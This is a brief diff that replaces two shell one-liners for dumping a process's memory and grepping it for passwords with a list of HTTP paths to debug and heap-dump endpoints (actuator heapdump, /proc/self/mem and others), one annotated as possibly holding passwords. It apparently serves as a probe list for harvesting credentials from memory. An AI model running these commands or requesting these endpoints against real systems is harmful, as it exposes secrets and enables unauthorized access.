@@ -1,2 +1,8 @@
-strings /proc/$(pgrep app)/mem 2>/dev/null | grep -i pass
-gcore $(pgrep app) && strings core | grep -i password
+GET /actuator/heapdump (contains passwords in heap?)
+GET /actuator/threaddump
+GET /debug/memory
+GET /api/debug/vars
+GET /proc/self/mem
+GET /diagnostics/memory-dump
+GET /api/heap
+GET /debug/heap-dump
